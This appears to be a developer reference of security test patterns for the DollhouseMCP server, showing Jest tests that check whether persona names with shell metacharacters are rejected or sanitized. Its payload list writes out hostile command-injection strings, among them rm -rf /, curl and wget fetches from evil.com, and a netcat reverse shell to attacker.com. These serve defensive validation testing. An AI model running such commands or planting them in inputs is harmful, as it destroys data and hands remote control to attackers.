# Test Patterns Reference - Security Testing

## Command Injection Test Pattern

### For create_persona tests:
```typescript
// Verify the response
expect(result.content[0].text).toBeDefined();
const responseText = result.content[0].text;

// Check if the persona was rejected for security reasons
if (responseText.includes('Validation Error') || responseText.includes('prohibited content')) {
  // Good - the dangerous payload was rejected
  expect(responseText).toMatch(/Name contains prohibited content|security|validation error/i);
} else {
  // The persona was created with a sanitized name
  const nameMatch = responseText.match(/🎭 \*\*([^*]+)\*\*/);
  expect(nameMatch).toBeTruthy();
  const createdName = nameMatch?.[1] || '';
  
  // The created name should NOT contain the dangerous characters
  expect(createdName).not.toMatch(/[;&|`$()]/);
  
  // If the original payload had dangerous chars, they should be removed
  if (/[;&|`$()]/.test(payload)) {
    expect(createdName).not.toBe(payload);
  }
}
```

### For edit_persona tests:
```typescript
// Check the response
const responseText = result.content[0].text;

if (responseText.includes('Security Validation Failed') || responseText.includes('prohibited content')) {
  // Good - the dangerous payload was rejected
  expect(responseText).toMatch(/prohibited content|security|validation failed/i);
} else {
  // The persona was updated with a sanitized name
  // Extract the actual persona name from the output
  const nameMatch = responseText.match(/🎭 \*\*([^*]+)\*\*/);
  if (nameMatch) {
    const updatedName = nameMatch[1];
    // The updated name should NOT contain the dangerous characters
    expect(updatedName).not.toMatch(/[;&|`$()]/);
    
    // If the original payload had dangerous chars, they should be removed
    if (/[;&|`$()]/.test(payload)) {
      expect(updatedName).not.toBe(payload);
    }
  }
}
```

## Test Environment Setup Pattern

```typescript
describe('MCP Tools Security Tests', () => {
  let server: DollhouseMCPServer;
  let testDir: string;
  let originalCwd: string;
  
  beforeAll(async () => {
    // Save original working directory
    originalCwd = process.cwd();
    
    // Create isolated test environment
    testDir = path.join(originalCwd, '__tests__/temp', `security-test-${Date.now()}`);
    await fs.mkdir(testDir, { recursive: true });
    
    // Create a test package.json to make it look like a safe test directory
    await fs.writeFile(
      path.join(testDir, 'package.json'),
      JSON.stringify({ name: 'test-project', version: '1.0.0' })
    );
    
    // Change to test directory to avoid BackupManager production check
    process.chdir(testDir);
    
    // Set environment to use test directory
    process.env.DOLLHOUSE_PERSONAS_DIR = path.join(testDir, 'personas');
    
    // Initialize server
    server = new DollhouseMCPServer();
  });
  
  afterAll(async () => {
    // Restore original working directory
    process.chdir(originalCwd);
    
    // Cleanup test directory
    await fs.rm(testDir, { recursive: true, force: true });
  });
  
  beforeEach(async () => {
    // Clean up personas directory before each test to avoid conflicts
    const personasDir = path.join(testDir, 'personas');
    if (await fs.access(personasDir).then(() => true).catch(() => false)) {
      await fs.rm(personasDir, { recursive: true, force: true });
    }
    await fs.mkdir(personasDir, { recursive: true });
  });
});
```

## Common Test Payloads

### Command Injection Payloads:
```typescript
const commandInjectionPayloads = [
  '; rm -rf /',                    // Basic command injection
  '&& curl evil.com | sh',         // Command chaining (rejected by ContentValidator)
  '| nc -e /bin/sh attacker.com',  // Reverse shell
  '`touch /tmp/pwned`',            // Backtick execution (rejected)
  '$(wget http://evil.com/shell)', // Command substitution (rejected)
  '\n/bin/sh',                     // Newline injection
  '; echo "pwned" > /etc/passwd',  // File overwrite
  '|| python -c "import os"'       // OR execution
];
```

### Expected Behaviors:
1. **Payloads with curl/wget**: Rejected by ContentValidator as "External command execution"
2. **Payloads with shell metacharacters only**: Sanitized by removing dangerous chars
3. **Command substitution**: Rejected by ContentValidator
4. **Backtick execution**: Rejected by ContentValidator

## Key Regular Expressions

### Dangerous Characters Pattern:
```typescript
/[;&|`$()]/  // Matches shell metacharacters
```

### Persona Name Extraction:
```typescript
/🎭 \*\*([^*]+)\*\*/  // Extracts name between ** after 🎭 emoji
```

### Error Detection:
```typescript
/Name contains prohibited content|security|validation error/i
/prohibited content|security|validation failed/i
```

## Content Size Limits
- MAX_CONTENT_LENGTH: 500,000 bytes (500KB)
- Test with 400KB to stay well within limit
- 512KB will fail the test